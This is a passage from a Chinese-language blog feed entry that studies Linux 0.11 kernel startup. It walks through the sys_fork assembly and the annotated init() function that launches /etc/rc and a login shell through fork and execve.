sync()系统调用：更新文件系统。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall0(<span class="keyword">int</span>,sync)</span><br></pre></td></tr></table></figure></li><li>可以直接跳到kernel/system_call.s的<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/kernel/system_call.s#L208">sys_fork</a>系统调用源码处查看。</li><li>可以知道主要进行了两个步骤。</li><li>find_empty_process:寻找空闲进程号码(个人觉得代码有点”累赘”)</li><li>copy_process:复制进程PCB,并修改某些字段以符合逻辑。关于其具体实现等到mm模块的时候再具体分析。最后在父进程中返回last_pid。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">### sys_fork()调用，用于创建子进程，是system_call功能<span class="number">2.</span></span><br><span class="line"># 首先调用C函数find_empty_process()，取得一个进程号PID。若返回负数则说明目前任务数组</span><br><span class="line"># 已满。然后调用copy_process()复制进程。</span><br><span class="line">.align <span class="number">2</span></span><br><span class="line">sys_fork:</span><br><span class="line">call find_empty_process</span><br><span class="line">testl %eax,%eax             # 在eax中返回进程号pid。若返回负数则退出。</span><br><span class="line">js <span class="number">1f</span></span><br><span class="line">push %gs</span><br><span class="line">pushl %esi</span><br><span class="line">pushl %edi</span><br><span class="line">pushl %ebp</span><br><span class="line">pushl %eax</span><br><span class="line">call copy_process</span><br><span class="line">addl $<span class="number">20</span>,%esp               # 丢弃这里所有压栈内容。</span><br><span class="line"><span class="number">1</span>:ret</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>之后main函数(即任务0)就一直死循环执行pause()系统调用。</li><li>而fork得到的子进程会调用init()函数并继续执行后期初始化。再之后的fork以及execve才调用shell。</li><li>并且再之后的while(1)循环会一直执行fork &amp; execve。这也是为什么在shell终端键入exit或者退出命令后显示一个进程号并仍然存在shell的原因。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在main()中已经进行了系统初始化，包括内存管理、各种硬件设备和驱动程序。init()函数</span></span><br><span class="line"><span class="comment">// 运行在任务0第1次创建的子进程(任务1)中。它首先对第一个将要执行的程序(shell)的环境</span></span><br><span class="line"><span class="comment">// 进行初始化，然后以登录shell方式加载该程序并执行。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid,i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setup()是一个系统调用。用于读取硬盘参数包括分区表信息并加载虚拟盘(若存在的话)</span></span><br><span class="line">    <span class="comment">// 和安装根文件系统设备。该函数用25行上的宏定义，对应函数是sys_setup()，在块设备</span></span><br><span class="line">    <span class="comment">// 子目录kernel/blk_drv/hd.c中。</span></span><br><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);        <span class="comment">// drive_info结构是2个硬盘参数表</span></span><br><span class="line">    <span class="comment">// 下面以读写访问方式打开设备&quot;/dev/tty0&quot;,它对应终端控制台。由于这是第一次打开文件</span></span><br><span class="line">    <span class="comment">// 操作，因此产生的文件句柄号(文件描述符)肯定是0。该句柄是UNIX类操作系统默认的</span></span><br><span class="line">    <span class="comment">// 控制台标准输入句柄stdin。这里再把它以读和写的方式别人打开是为了复制产生标准输出(写)</span></span><br><span class="line">    <span class="comment">// 句柄stdout和标准出错输出句柄stderr。函数前面的&quot;(void)&quot;前缀用于表示强制函数无需返回值。</span></span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);                      <span class="comment">// 复制句柄，产生句柄1号——stdout标准输出设备</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);                      <span class="comment">// 复制句柄，产生句柄2号——stderr标准出错输出设备</span></span><br><span class="line">    <span class="comment">// 打印缓冲区块数和总字节数，每块1024字节，以及主内存区空闲内存字节数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d buffers = %d bytes buffer space\n\r&quot;</span>,NR_BUFFERS,</span><br><span class="line">NR_BUFFERS*BLOCK_SIZE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free mem: %d bytes\n\r&quot;</span>,memory_end-main_memory_start);</span><br><span class="line">    <span class="comment">// 下面fork()用于创建一个子进程(任务2)。对于被创建的子进程，fork()将返回0值，对于</span></span><br><span class="line">    <span class="comment">// 原进程(父进程)则返回子进程的进程号pid。该子进程关闭了句柄0(stdin)、以只读方式打开</span></span><br><span class="line">    <span class="comment">// /etc/rc文件，并使用execve()函数将进程自身替换成/bin/sh程序(即shell程序)，然后</span></span><br><span class="line">    <span class="comment">// 执行/bin/sh程序。然后执行/bin/sh程序。所携带的参数和环境变量分别由argv_rc和envp_rc</span></span><br><span class="line">    <span class="comment">// 数组给出。关闭句柄0并立即打开/etc/rc文件的作用是把标准输入stdin重定向到/etc/rc文件。</span></span><br><span class="line">    <span class="comment">// 这样shell程序/bin/sh就可以运行rc文件中的命令。由于这里的sh的运行方式是非交互的，</span></span><br><span class="line">    <span class="comment">// 因此在执行完rc命令后就会立刻退出，进程2也随之结束。</span></span><br><span class="line">    <span class="comment">// _exit()退出时出错码1 - 操作未许可；2 - 文件或目录不存在。</span></span><br><span class="line"><span class="keyword">if</span> (!(pid=fork())) &#123;</span><br><span class="line">close(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (open(<span class="string">&quot;/etc/rc&quot;</span>,O_RDONLY,<span class="number">0</span>))</span><br><span class="line">_exit(<span class="number">1</span>);                       <span class="comment">// 如果打开文件失败，则退出(lib/_exit.c)</span></span><br><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,argv_rc,envp_rc);  <span class="comment">// 替换成/bin/sh程序并执行</span></span><br><span class="line">_exit(<span class="number">2</span>);                           <span class="comment">// 若execve()执行失败则退出。</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 下面还是父进程(1)执行语句。wait()等待子进程停止或终止，返回值应是子进程的进程号(pid).</span></span><br><span class="line">    <span class="comment">// 这三句的作用是父进程等待子进程的结束。&amp;i是存放返回状态信息的位置。如果wait()返回值</span></span><br><span class="line">    <span class="comment">// 不等于子进程号，则继续等待。</span></span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> (pid != wait(&amp;i))</span><br><span class="line"><span class="comment">/* nothing */</span>;</span><br><span class="line">    <span class="comment">// 如果执行到这里，说明刚创建的子进程的执行已停止或终止了。下面循环中首先再创建</span></span><br><span class="line">    <span class="comment">// 一个子进程，如果出错，则显示“初始化程序创建子进程失败”信息并继续执行。对于所</span></span><br><span class="line">    <span class="comment">// 创建的子进程将关闭所有以前还遗留的句柄(stdin, stdout, stderr),新创建一个会话</span></span><br><span class="line">    <span class="comment">// 并设置进程组号，然后重新打开/dev/tty0作为stdin,并复制成stdout和sdterr.再次</span></span><br><span class="line">    <span class="comment">// 执行系统解释程序/bin/sh。但这次执行所选用的参数和环境数组另选了一套。然后父</span></span><br><span class="line">    <span class="comment">// 进程再次运行wait()等待。如果子进程又停止了执行，则在标准输出上显示出错信息</span></span><br><span class="line">    <span class="comment">// “子进程pid挺直了运行，返回码是i”,然后继续重试下去....，形成一个“大”循环。</span></span><br><span class="line">    <span class="comment">// 此外，wait()的另外一个功能是处理孤儿进程。如果一个进程的父进程先终止了，那么</span></span><br><span class="line">    <span class="comment">// 这个进程的父进程就会被设置为这里的init进程(进程1)，并由init进程负责释放一个</span></span><br><span class="line">    <span class="comment">// 已终止进程的任务数据结构等资源。</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((pid=fork())&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fork failed in init\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!pid) &#123;                                 <span class="comment">// 新的子进程</span></span><br><span class="line">close(<span class="number">0</span>);close(<span class="number">1</span>);close(<span class="number">2</span>);</span><br><span class="line">setsid();                               <span class="comment">// 创建一新的会话期</span></span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">_exit(execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> (pid == wait(&amp;i))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\rchild %d died with code %04x\n\r&quot;</span>,pid,i);</span><br><span class="line">sync();                                     <span class="comment">// 同步操作，刷新缓冲区。</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// _exit()和exit()都用于正常终止一个函数。但_exit()直接是一个sys_exit系统调用，</span></span><br><span class="line">    <span class="comment">// 而exit()则通常是普通函数库中的一个函数。它会先执行一些清除操作，例如调用</span></span><br><span class="line">    <span class="comment">// 执行各终止处理程序、关闭所有标准IO等，然后调用sys_exit。</span></span><br><span class="line">_exit(<span class="number">0</span>);<span class="comment">/* NOTE! _exit, not exit() */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>此时Linux 0.11内核已经起来了，当然还有一大波驱动代码和系统调用、库函数、文件系统(重点)和调度策略等等等没有分析，后面将挑出个人认为重点的部分记录。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;init进程来了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
      <category term="Asm" scheme="https://embpgp.github.io/tags/Asm/"/>
    
  </entry>
  
</feed>
